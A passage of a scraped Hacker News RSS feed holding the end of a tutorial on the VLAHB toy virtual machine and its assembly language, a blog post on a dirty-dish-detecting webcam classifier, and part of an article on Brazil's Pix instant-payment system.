EXIT</code></pre>


    <h2>Labels</h2>

    <p>Our assembly language supports a primitive to functions called <b>LABELS</b>. When assembly code is compiled down to machine instructions for the virtual machine, labels don't appear in the code. Instead they are treated as markers in the code where you can loop to, jump to, etc. Therefore it is better to write <b>GOTO MY_FIRST_LABEL</b> rather than something like <b>GOTO 1729</b>.</p>

    <pre><code>MATH_ADD_TWO_NUMBERS:
LD R[4100] R[0]
ADD R[4100] R[1]  // store the sum of R[0] and R[1] into R[4100]
RETURN
</code></pre>

    <p><i>Q. Why are we storing stuff in <b>R[4100]</b>?</i></p><p>

    <i>A. Our function output is by convention stored at <b>R[4100]</b>. We could have picked <b>R[1729]</b>.</i></p><p>To jump the pc to a label, call it with the <b>CALL</b> opcode. This pushes the current pc to the <b>stack</b> - a stack in the CPU - and the pc is set to the line where the label is</p>

    <p><b>RETURN</b>: this <b>pops</b> the pc from the stack and sets the pc to that popped value. If we write something like the code snippet below then ram will not be touched.</p>



    <pre><code>CALL WHAT_IS_LIFE
EXIT

// we never go here
LD R[0] 55
LD R[1] 51
LD R[2] 44

WHAT_IS_LIFE:
    RETURN
</code></pre>


    <p><i>But why?</i> Once we hit <b>CALL WHAT_IS_LIFE</b>, the pc will be pushed, and the pc jumps to <b>WHAT_IS_LIFE</b>. The stack and pc now looks like this:</p>

    <pre>    stack = [0]
    pc = 0
    </pre>

    <p>In the next line we hit a <b>RETURN</b>, which means we <b>pop</b> from the stack and assign our pc to that value.</p>

    <pre>    stack = [ ]
    pc = 0
    </pre>

    <p>Now we advance a line to the second line of our program and hit <b>EXIT</b>. The vm exits.</p>
    
    <hr>

    <p><b>Exercise 2</b> Describe in your own words what the program below is doing to ram.

    </p><pre><code>LD R[0] 3
LD R[1] 4
CALL DO_SOMETHING
EXIT

DO_SOMETHING:
    LD R[4100] R[0]
    ADD R[4100] R[1]
    RETURN
</code></pre>


    <h2>Pointers</h2>

    <p>Let's say you want to be able to programmatically place values in ram with assembly. Let's say for instance you want to put 7 in R[3], 7 in R[6], and 7 in R[9].</p>

    <p>Notice that our index of ram is a multiple of 3 each time: 3, 6, 9. We can write</p>

    <pre><code>LD R[3] 7
LD R[6] 7
LD R[9] 7
</code></pre><p>

    but with a pointer:

    </p><pre><code>LD R[4096] 3  // pointer U
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 6
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 9
LD R[U] 7
</code></pre>


    <p><i>How does this work?</i></p><p>
        A <b>pointer</b> refers to a slot of ram that the vm treats in a _special_ way. The word _special_ refers to vm interpreting that value as an index of ram. <b>VLAHB</b> has 4 hard-coded slots for pointers, located at ram slots <b>R[4096]</b>, <b>R[4097]</b>, <b>R[4098]</b> and <b>R[4099]</b>, with the designated letters <b>U</b>, <b>V</b>, <b>Y</b>, <b>Z</b> respectively.
    </p>

    <table>
        <tbody><tr>
            <th>letter</th>
            <th>ram slot</th>
        </tr>
        <tr>
            <td>U</td>
            <td>R[4096]</td>
        </tr>
        <tr>
            <td>V</td>
            <td>R[4097]</td>
        </tr>
        <tr>
            <td>Y</td>
            <td>R[4098]</td>
        </tr>
        <tr>
            <td>Z</td>
            <td>R[4099]</td>
        </tr>
    </tbody></table>

    <br>

    <div><p>
        Look at the first two lines of asm code above. We first load 3 into 4096. The second line is <b>LD R[U] 7</b>. This tells the program to load a 7 into the ram[ram[4096]]. </p><p> Since ram[4096] = 3, we are loading 7 into ram[3].
    </p></div>

    <pre><code>ram := [0][0][0][7][0][0][0][0]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
</code></pre>

    <p><b>NB</b> There are more opcodes built into <b>VLAHB</b> that use pointers. Checkout <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a> to see them all.

    </p><hr>

    <p><b>Exercise 3</b> The code snippet below loads the integer <b>7</b> into slots 120 to 130 inclusive. Rewrite the code below using the opcode <b>LD R[U] R[V]</b>.

    </p><pre><code>LD R[120] 7
LD R[121] 7
LD R[122] 7
LD R[123] 7
LD R[124] 7
LD R[125] 7
LD R[126] 7
LD R[127] 7
LD R[128] 7
LD R[129] 7
LD R[130] 7
</code></pre>


    <h2>Conditional Opcodes</h2>

    <p>A subset of opcodes are called <b>conditional</b> and can result in the pc skipping the next line of assembly code (that's +2 lines in machine code since each valid assembly line maps to exactly 2 lines of machine code after it's compiled). These opcodes compare one value with another. These opcodes are called conditional because they may jump over an extra line of assembly depending on some condition.</p>

    <p>For example <b>CMP R[0] 2</b> checks if ram[0] is equal to 2. If it is, skip next line. Else, do nothing. Read the example below carefully</p>

    <pre><code>LD R[0] 4
LD R[1] 0

CMP R[0] 8  // if R[0] == 8, skip next line
LD R[1] 1
EXIT  // R[1]=1 at end of program
</code></pre>

    <table>
        <tbody><tr>
            <th>opcode</th>
            <th>meaning</th>
        </tr>
        <tr>
            <td>CMP</td>
            <td>is equal to</td>
        </tr>
        <tr>
            <td>LT</td>
            <td>less than, &lt;</td>
        </tr>
        <tr>
            <td>LTE</td>
            <td>less than or equal, &lt;=</td>
        </tr>
        <tr>
            <td>GT</td>
            <td>greater than, &gt;</td>
        </tr>
        <tr>
            <td>GTE</td>
            <td>greater than or equal, &gt;=</td>
        </tr>
    </tbody></table>

    <hr>

    <p><b>Exercise 4</b> What is loaded into slot <b>R[33]</b> when the program hits <b>EXIT</b>?</p>

    <pre><code>LD R[0] 3
LD R[33] 0

CMP R[0] 2
ADD R[33] 1
GTE R[0] 2
ADD R[33] 1
ADD R[33] 2

EXIT
</code></pre>

    <h2>VRAM</h2>

    <p>A subset of our ram slots are dedcated to pixels for the 160X144 px display. This happens to be the same resolution of the original Game Boy. The choice of vram slots is arbitrary so we'll pick slots from ram[4101] to ram[27140] inclusive. These slots map onto the screen from top to bottom, left to right, starting with the top-left pixel.</p>

    <p>An int stored in vram is interpreted as an rgba color. It is easier to load a hexidecmial integer as it's easier to read what color you are loading.</p>

    <p><b> Ex. 1 </b> red pixel in top left corner</p>

    <pre><code>// let's place a red pixel at the top-left corner

LD R[4101] 0XFF0000FF // rgba(255,0,0,255)
BLIT  // this draws the screen

INFINITE_LOOP:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP  // loop forever so we can see the red dot
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_1px.png"></p><p><b> Ex. 2 </b> red, green, blue pixels in top left corner</p>

    <pre><code>LD R[4101] 0XFF0000FF // red
LD R[4102] 0X00FF00FF // green
LD R[4103] 0X0000FFFF // blue
BLIT

INFINITE_LOOP_2:
    INPUT R[0]
    SHT R[0] R[29000] 6  // END
    SHT R[0] R[29001] 7  // ESC

    // exit vm if press ESC or END
    CMP R[29000] 0
        EXIT
    CMP R[29001] 0
        EXIT

    GOTO INFINITE_LOOP_2  // loop forever
</code></pre>

    <p><img src="http://adamkulidjian.com/imgs/vram_3px.png"></p><h2>Write an Assembly Game</h2>

    <ul>
        <li>Clone the repo from <a href="https://github.com/Kully/VLAHB">Github</a></li>
        <li>Read <a href="https://github.com/Kully/VLAHB/blob/master/README.md">README.md</a></li>
    </ul>

    <h4>Tips</h4>

    <ol>
        <li>See <a href="https://github.com/Kully/VLAHB/blob/master/asm/pong.asm">pong.asm</a> for a reference on how to code user input into a game. The <b>INPUT</b> and <b>SHT</b> opcodes are necessary for this.</li>

        <li>Use <i>C</i> syntax highlighting for your text editor for asm files.</li>

        <li>Checkout <a href="https://github.com/Kully/VLAHB/blob/master/asm/sprites.asm">sprite.asm</a> in the repo. It contains 5X5 px sprites for numbers 0-9 and letters A-Z.</li>

        <li>Slots 27141-65535 have no special designation and are free to use for anything you want. You can store variables, perform arithmetic, etc.</li>
    </ol>


    <h4>Debugging</h4>

    <p>Run the following in your terminal to get a 4 byte wide hexdump of the binary file vlahb generated above.</p>

    <pre><code>
$ xxd -c 4 bin/file.bin
    </code></pre>

    <p><img src="http://adamkulidjian.com/imgs/xxd_output.png"></p><p>You can see debug messages as you run <i>vm.c</i> by changing <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L17">this line</a> to <b>#define DEBUG 1</b>. Warning: it is very slow.</p>

    <p><img src="http://adamkulidjian.com/imgs/debug_in_vm.png"></p><h2>Thank You!</h2>

    <p>Thank you taking the time to read and as always. <b>Feedback is highly ‚Ä¶</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://adamkulidjian.com/vlahb.html">http://adamkulidjian.com/vlahb.html</a></em></p>]]>
            </description>
            <link>http://adamkulidjian.com/vlahb.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942137</guid>
            <pubDate>Fri, 30 Oct 2020 13:49:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dish-o-tron ‚Äì an ironic (hopefully) fun deep learning tutorial]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24942115">thread link</a>) | @mamikl
<br/>
October 30, 2020 | https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/ | <a href="https://web.archive.org/web/*/https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Sadly, to tell you the truth, doing dishes is still a thing. However, so far most of our readers still like our non-standard Deep Learning tutorial.</em></p><p>Typically, AI is demonstrated as solving various toy problems. AI plays chess and Go, AI plays video games, AI makes people dance. It is time to stop this madness and finally apply AI in a meaningful way. Therefore, we proudly present the dish-o-tron. The dish-o-tron is an AI system designed to solve an actual real-world problem impacting millions of people around the world every day: facing dirty dishes in the community kitchen sink.</p><div id="attachment_77683"><p><a href="https://blog.codecentric.de/files/2020/09/real_world_problem.png"><img aria-describedby="caption-attachment-77683" loading="lazy" src="https://blog.codecentric.de/files/2020/09/real_world_problem-250x107.png" alt="dirty dishes in the community kitchen sink" width="250" height="107" srcset="https://blog.codecentric.de/files/2020/09/real_world_problem-250x107.png 250w, https://blog.codecentric.de/files/2020/09/real_world_problem-700x300.png 700w, https://blog.codecentric.de/files/2020/09/real_world_problem-768x329.png 768w, https://blog.codecentric.de/files/2020/09/real_world_problem-1536x659.png 1536w, https://blog.codecentric.de/files/2020/09/real_world_problem-120x51.png 120w, https://blog.codecentric.de/files/2020/09/real_world_problem.png 1600w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77683">dirty dishes in the community kitchen sink ‚Äì a real-world problem</p></div><p>Reading this blog series will equip you with the ultimate power to solve this long-lasting problem in your community kitchen once and for all by using state-of-the-art AI technology.</p><h2>The dish-o-tron</h2><p>At first glance, the dish-o-tron is an inconspicuous, well-positioned webcam in the kitchen observing the shared kitchen sink. In its natural state the dish-o-tron is just happy and enjoys life. The dish-o-tron doesn‚Äôt care whether you prefer tea or coffee and it likes all kinds of kitchen talk. However, there is one single thing that the dish-o-tron absolutely hates: watching someone put dirty dishes in the community sink.</p><p>Detecting dirty dishes in the sink enrages the peace-loving dish-o-tron so much that it starts beeping. The only way to return it to its natural peaceful state and thus stopping the noise is to admit one‚Äôs mistake and remove all dirty dishes from the community sink, leaving it neat and clean again.</p><div id="attachment_78576"><p><a href="https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen.png"><img aria-describedby="caption-attachment-78576" loading="lazy" src="https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-250x166.png" alt="respect privacy in the kitchen" width="250" height="166" srcset="https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-250x166.png 250w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-700x465.png 700w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-768x510.png 768w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-1536x1020.png 1536w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen-120x80.png 120w, https://blog.codecentric.de/files/2020/09/surveillance_in_kitchen.png 1984w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-78576">privacy in the kitchen has to be respected.</p></div><p>Building the dish-o-tron requires three high-level steps:</p><ul><li>Gathering and preparing data</li><li>Training an AI model</li><li>Deployment of the model</li></ul><p>In the following, we will discuss these steps further.</p><h2>Gathering and preparing data</h2><p>Trying to solve real-world problems with AI often starts with the realisation that there is little or even no data available. This issue prevents many problem solvers from actually solving the problem. ‚ÄúIf only data collection had started years ago!‚Äù, they say, ‚Äúthen we could now actually solve the problem‚Äù. While this is a reasonable thought, it simply doesn‚Äôt help.</p><p>Consoling users currently facing a problem by saying that it is necessary to gather lots of data for quite some time before we can start building a solution is at least challenging. Typically a more promising approach is to build a system addressing the problem which is able to improve over time.</p><p>In this way, we will not solve the problem completely in the first step; however, we will tackle the problem right away and put ourselves in a position to iteratively adjust the solution to match the requirements which also become more and more clear while working on the problem.</p><p>Since our problem is unique in a sense that there is no Kaggle dataset readily available, we start our journey to building the dish-o-tron by doing our best to collect a suitable dataset for a first working system. Here, we will make videos of various kitchen sinks clean and not clean and split them up into a first labeled dataset.</p><p>In this way, we started collecting the DIRTY-DISHES-DATASET with thousands of pictures that we will share with you in the next article.</p><div id="attachment_77687"><p><a href="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset.png"><img aria-describedby="caption-attachment-77687" loading="lazy" src="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-250x151.png" alt="sample images from the dirty-dishes dataset" width="250" height="151" srcset="https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-250x151.png 250w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-700x424.png 700w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-768x465.png 768w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset-120x73.png 120w, https://blog.codecentric.de/files/2020/09/dirty_dishes_dataset.png 1004w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77687">sample images from the dirty-dishes dataset</p></div><h2>Training an AI model</h2><p>Not so long ago, training an AI model was tedious and required expert knowledge. In many cases this is still true today. Depending on the problem, we have to figure out a suitable model architecture and feature engineering and this requires some experimentation before we can train a suitable AI model. This is another issue which prevents problem solvers from building a solution tackling the whole problem even if data is available.</p><p>Fortunately, image classification is one of the best understood use cases in AI. There are lots of established best practices regarding model architectures and training of models. Among others this led to two things:</p><ul><li>High-level software libraries such as fast.ai which abstract away lots of the nitty-gritty details of image classification, providing a black-box kind of approach where state-of-the-art practises are simply utilised without burdening the user with the details.</li><li>Machine Learning as a service offerings from various public cloud providers such as automl and rekognition allowing training of image classification models on custom data in a few simple steps.</li></ul><p>Both approaches will typically not lead to the absolutely best solution. However, most of the time this is not necessary and ‚Äògood enough‚Äô will be just fine and a nice trade-off between time &amp; money spent vs. result. For our first version of the dish-o-tron, we will employ the <a href="https://cloud.google.com/automl" target="_blank" rel="noopener noreferrer">AutoML Service</a> from Google Cloud to train a first model.</p><p>We can use various tools to inspect the model and try to explain if the black box learns what we expect.</p><div id="attachment_77689"><p><a href="https://blog.codecentric.de/files/2020/09/explain_model.png"><img aria-describedby="caption-attachment-77689" loading="lazy" src="https://blog.codecentric.de/files/2020/09/explain_model-250x191.png" alt="visualizing what the dish-o-tron model has actually learned" width="250" height="191" srcset="https://blog.codecentric.de/files/2020/09/explain_model-250x191.png 250w, https://blog.codecentric.de/files/2020/09/explain_model-700x535.png 700w, https://blog.codecentric.de/files/2020/09/explain_model-768x587.png 768w, https://blog.codecentric.de/files/2020/09/explain_model-120x92.png 120w, https://blog.codecentric.de/files/2020/09/explain_model.png 1412w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77689">Visualizing what the model has actually learned.</p></div><p>The training of the AI model with AutoML and its technical details will be discussed in a follow-up blog post.</p><h2>Deployment of the model</h2><p>Having an AI model generally will not solve an actual real-life problem. For a viable solution, the AI model has to be integrated into a suitable context. Many times, this is the key step to generating any value at all. Nevertheless, this step is often postponed to the distant future after ‚Äúcollecting high quality data‚Äù and ‚Äúbuilding the best AI model‚Äù. This is, more often than not, a mistake because integrating the model into its context poses various challenges on its own. Hence, it should not be ignored and instead tackled early in order to learn and identify the associated challenges.</p><p>While building the dish-o-tron, we tried multiple options to run the model. We deployed it on a Pi Zero which is a really small and cheap device that can be glued anywhere with a small powerbank. But it is rather slow. We ran the model in the browser using our notebook‚Äôs webcam with TensorFlow.js. We used the Google AIY Kit, which is much faster than the Pi Zero and also comes with a beeper and blinking lights (but it is quite old and deploying state-of-the-art models is hacky). Finally, we used the Google Coral device, which is made for this kind of workload and well-integrated into Google AutoML but comes with a price tag.</p><p>The community kitchen is a special place. It‚Äôs a place where rumors are born, where gossip is produced and where you can openly chat about the most secret secrets of your company! That‚Äôs why dish-o-tron is living on the edge. Edge devices enable you to run audio and video analytics AND respect the privacy of your community kitchen. No image is transferred to the cloud. Nothing is saved. Dish-o-tron sees and forgets.</p><div id="attachment_77691"><p><a href="https://blog.codecentric.de/files/2020/09/various_edge_devices.png"><img aria-describedby="caption-attachment-77691" loading="lazy" src="https://blog.codecentric.de/files/2020/09/various_edge_devices-250x85.png" alt="various edge devices" width="250" height="85" srcset="https://blog.codecentric.de/files/2020/09/various_edge_devices-250x85.png 250w, https://blog.codecentric.de/files/2020/09/various_edge_devices-700x237.png 700w, https://blog.codecentric.de/files/2020/09/various_edge_devices-768x261.png 768w, https://blog.codecentric.de/files/2020/09/various_edge_devices-1536x521.png 1536w, https://blog.codecentric.de/files/2020/09/various_edge_devices-2048x695.png 2048w, https://blog.codecentric.de/files/2020/09/various_edge_devices-120x41.png 120w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77691">Various edge devices</p></div><p>Moreover, the hardware we consider and buy in order to actually build the dish-o-tron will establish basic conditions for our solution space. In other words, we have to mind that it is possible to painlessly deploy the AI model on our preferred edge device. For the first version of the dish-o-tron, we decided to use a Google AIY kit (see video below). For the next version, we chose a Google Coral edge device, which allows us to run advanced computer vision tasks on a Raspberry-size mini computer. Fortunately, AutoML allows us to export models in a viable format.</p><div id="attachment_77693"><p><a href="https://blog.codecentric.de/files/2020/09/google_coral_device.png"><img aria-describedby="caption-attachment-77693" loading="lazy" src="https://blog.codecentric.de/files/2020/09/google_coral_device-250x131.png" alt="Google coral device" width="250" height="131" srcset="https://blog.codecentric.de/files/2020/09/google_coral_device-250x131.png 250w, https://blog.codecentric.de/files/2020/09/google_coral_device-700x366.png 700w, https://blog.codecentric.de/files/2020/09/google_coral_device-768x401.png 768w, https://blog.codecentric.de/files/2020/09/google_coral_device-1536x803.png 1536w, https://blog.codecentric.de/files/2020/09/google_coral_device-120x63.png 120w, https://blog.codecentric.de/files/2020/09/google_coral_device.png 1600w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77693">Google coral device</p></div><p>The construction of the dish-o-tron including the deployment of the model on the Coral device and its technical details will be discussed in an upcoming blog post.</p><h2>Conclusion</h2><p>AI research has brought us new technology that can solve problems that couldn‚Äôt be solved before. Have you read the book <em>AI superpowers</em> by Kai-Fu Lee? He says that you don‚Äôt need to be one of the best AI researchers any more to apply AI and find new business opportunities. You need to collect (lots of) data and can ‚Äújust‚Äù use existing algorithms, services and open source frameworks. Well, in our opinion building AI solutions is not easy ‚Äì but it is indeed getting easier and easier every day.</p><p>See the first prototype running on the google AIY kit here (mind the green/red LED at the box):</p><p>Follow this blog series if you want to know how to build and run such a model on an edge device yourself. Building the dish-o-tron will fundamentally change the way you experience the community kitchen. Instead of being a place of constant anger and hostility, the community kitchen will become a peaceful meeting ground for sharing ideas and connecting with co-workers.</p><p>In the upcoming blog posts, we will guide you through the process of building your own dish-o-tron for your community kitchen sink. Hence, we will tackle a real-world problem and playfully learn how to build and improve an AI system from scratch. Stay tuned!</p><p>Continue with the <a href="https://blog.codecentric.de/en/2020/09/dish-o-tron-gather-that-data-you-must/">the second part of our series</a> where we start with gathering data.</p></div></div>]]>
            </description>
            <link>https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942115</guid>
            <pubDate>Fri, 30 Oct 2020 13:46:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brazil will launch its first nationwide digital instant-payment system]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942060">thread link</a>) | @imartin2k
<br/>
October 30, 2020 | https://restofworld.org/2020/cash-debit-or-pix/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/cash-debit-or-pix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Next month, Brazil will launch its first nationwide digital instant-payment system. On November 16, Pix will go live on banking apps, digital wallets, and other services throughout Latin America‚Äôs largest financial market.&nbsp;</p>



<p>Pix was created by Brazil‚Äôs <a href="https://content.next.westlaw.com/w-006-8837?transitionType=Default&amp;contextData=(sc.Default)&amp;__lrTS=20191105091102789&amp;firstPage=true">Central Bank</a>, which has the power of life and death over all Brazilian financial institutions. The system is virtually free to use, a novelty in a country with a very efficient but expensive banking system.</p>



<p>Although it will be mandatory only for the largest banks, Pix will be available for all Brazilians whose bank or credit union opts in. Already, people are embracing the new system; on the first registration day ahead of launch, <a href="https://neofeed.com.br/blog/home/no-pix-uma-lista-e-a-chave-da-discordia-entre-bancos-e-fintechs/">millions of users</a> signed up for the service.&nbsp;</p>



<p>But not everyone is so enthusiastic. Pix‚Äôs simplicity and low cost will eat into the revenue streams of big banks, which typically charge users for fast transfers. It also complicates the business models of some of Brazil‚Äôs most successful startups. And by combining these features with a countrywide mandate, Pix might finally accomplish something that up until a few years ago was unthinkable: killing cash transactions in Brazil.</p>



<h3><strong>Why did the Brazilian Central Bank create Pix?</strong></h3>



<p>Pix has been in the works<a href="https://www.bcb.gov.br/estabilidadefinanceira/gtpaginst_reunioes"> since mid-2018</a>. Back then, there were a few instant-payment systems available in Brazil. Yet those that did exist were either limited to a specific bank‚Äôs clientele or had been launched by startups.&nbsp;</p>



<div><p>‚ÄúWe had been signaling the need for instant payments to the market since 2013,‚Äù said Mayara Yano, an analyst at the Central Bank. But, according to Yano, there were too many barriers and not enough incentives for a private company to create a service to be adopted by the banking system as a whole.</p><p>With Pix, the Central Bank also means to restrain the use of paper money, still popular in everyday life. It‚Äôs typical of mom and pop shops to offer 5% to 10% discounts for cash payments to avoid card-processing fees, for example.</p></div>



<p>Limiting paper currency with Pix would help the Central Bank with two other problems: limit its expenses with producing and distributing bills and coins, and boost the government‚Äôs investigations of financial fraud, <a href="https://www.bloomberg.com/news/articles/2020-10-07/bolsonaro-declares-brazil-corruption-free-and-ends-carwash-probe">a hot-button issue in Brazil</a>. After all, cash transactions are almost impossible to track, but Pix payments will be all saved in their users‚Äô banking apps.<br></p>



<p>Pix isn‚Äôt the first government-imposed payment mandate in Brazil‚Äôs history. In 2002, the Central Bank created a money transfer mechanism that took less than one hour on weekdays and would be completed by the next working day on weekends and holidays. The mechanism, called TED, was mandatory for all banks.</p>



<p><br>Pix, of course, isn‚Äôt mandatory for everybody. But it may as well be, since it is mandatory for banks with more than 500,000 clients; the group comprises 34 banks, which serve 90% of the <a href="https://www1.folha.uol.com.br/mercado/2020/10/pandemia-leva-a-bancarizacao-de-quase-10-milhoes-de-pessoas.shtml">175.4 million Brazilians who own bank accounts</a>. It is optional for smaller banks, fintech startups, credit unions, and other financial service providers.</p>



<h3><strong>How will it work?</strong></h3>



<div><p>Pix relies on identifiers like QR codes, email addresses, and telephone numbers to perform money transfers in up to 10 seconds, including on weekends and holidays. It will be incorporated into banking and payment apps, digital wallets, and other kinds of financial services. Once available, Pix will provide an alternative to existing fast money transfers, which cost an average of 10 Brazilian reais each in fees ($2).</p><p>The system functions virtually for free<strong>; </strong>the Central Bank charges financial institutions just 1 Brazilian centavo ($0.0018) for every 10 Pix transactions, and it‚Äôs up to them if they will pass along that cost to their clients.</p><p>To sign up, a user must submit up to five pieces of personal information, such as an email address, a cell phone number, or a tax ID, that will be used as a ‚ÄúPix key‚Äù to identify them in a money transfer. Users will also be given a QR code, which can be used to send or receive payments. If they have a bank account, they can use their checking account information to process a Pix transaction, much like a traditional bank transfer.</p></div>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/pix-registry3-40x79.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/pix-registry3-600x1066.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/pix-registry3-400x786.jpg 400w, https://restofworld.org/wp-content/uploads/2020/10/pix-registry3-600x1180.jpg 600w, " sizes="300px" alt="During the sign-up, users need to enroll a key (" chaves="" pix")="" consisting="" of="" a="" piece="" personal="" information."="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<h3><strong>How will Pix affect Brazilian banks and fintech startups?</strong></h3>



<p>The government hasn‚Äôt disclosed any studies of how Pix could impact Brazil‚Äôs economy. But it‚Äôs clear that the new technology will hit big banks the hardest, as well as big-name payment intermediaries, like point-of-sale and card-machine operators Cielo and Rede. German consulting group Roland Berger forecasts that the latter could lose up to <a href="https://valorinveste.globo.com/mercados/renda-variavel/empresas/noticia/2020/07/03/pix-tira-ate-r-13-bi-de-credenciadoras.ghtml"></a><a href="https://valorinveste.globo.com/mercados/renda-variavel/empresas/noticia/2020/07/03/pix-tira-ate-r-13-bi-de-credenciadoras.ghtml">13 billion reais</a> ($2.6 billion).&nbsp;</p>



<p>Pix also threatens what has been a lucrative revenue stream for Brazil‚Äôs ‚ÄúBig Five‚Äù banks ‚Äî Ita√∫, Bradesco, Santander, Banco do Brasil, and Caixa Econ√¥mica Federal ‚Äî which collectively make 2.2 billion reais ($440 million) a year from fees for same-day money transfers.</p>







<p>But a potential loss in transfer revenues isn‚Äôt the only danger to the Big Five. Now that they‚Äôre on the same footing when it comes to transfer fees, they risk losing clients to digital wallets and online-only banks. As of 2019, more than <a href="https://www.bcb.gov.br/content/publicacoes/relatorioeconomiabancaria/REB_2019.pdf">80% of Brazil‚Äôs total credit operations</a>, valued at 2.90 trillion reais ($580 billion), were concentrated in the Big Five. ‚ÄúPix will challenge the entire market to provide quality digital services at lower prices,‚Äù said Cl√°udio Guimar√£es J√∫nior, executive director of the Brazilian Association of Banks.&nbsp;</p>



<p>Traditional banks such as Ita√∫ e Bradesco<a href="https://einvestidor.estadao.com.br/ultimas-noticias/itau-e-do-bradesco-chamam-atencao-para-seguranca-e-defendem-pix"> have voiced concerns</a> about the system‚Äôs security and complained that the launch date is too early. ‚Äú[Battling Pix] is like trying to stop the wind with your hands,‚Äù said Jo√£o Bragan√ßa, specialist in payment methods at Roland Berger.&nbsp;</p>



<div><p>But the effects of Pix could cut both ways. Established digital payment startups like <a href="https://labsnews.com/en/news/business/brazilian-instant-payment-pix-will-allow-withdrawals-in-retail-stores/">PicPay</a>, with its 20 million active users, and <a href="https://www.nasdaq.com/articles/brazils-pagseguro-digital-raises-23-billion-ipo-stock-jumps-2018-01-24">PagSeguro</a>, which raised about 13.2 billion reais ($2.3 billion) during its initial public offering on Nasdaq, may be in trouble. One of their services is instant digital payments, something Pix will provide universally and for free.</p><p>But whether you‚Äôre a big bank or a small fintech firm, there‚Äôs no fighting the Central Bank. The Brazilian government will also allow big retailers to adopt Pix as a payment option, often with cashback offers, a novelty in Brazil. In order to compete, PicPay and other digital-payment companies will need to diversify their services.&nbsp;</p></div>






		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-40x20.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-400x200.png 400w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-600x299.png 600w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-1000x499.png 1000w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-1600x798.png 1600w, https://restofworld.org/wp-content/uploads/2020/10/Screen-Shot-2020-10-23-at-9.38.44-AM-2800x1397.png 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="The system will mitigate cost for end-users and charge 0.001 reais per transaction from the banks and fintech.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder"><a href="https://www.bcb.gov.br/estabilidadefinanceira/negociopix" target="_blank" rel="noopener noreferrer">https://www.bcb.gov.br</a></span>
			</figcaption>
		</figure>


<h3><strong>What will change for Brazilians?</strong></h3>



<p>Even with Brazilians being as fond of cash as they are now, financial experts are expecting Pix to gain a stranglehold on non-cash payments and money transfers within the next few years. An analysis by Accenture anticipates some <a href="https://labsnews.com/en/articles/technology/brazils-instant-payments-system-can-reach-20-million-users-in-its-first-year/">48 billion reais</a> ($9.6 billion) to move through the Pix system by the end of its first year.&nbsp;</p>



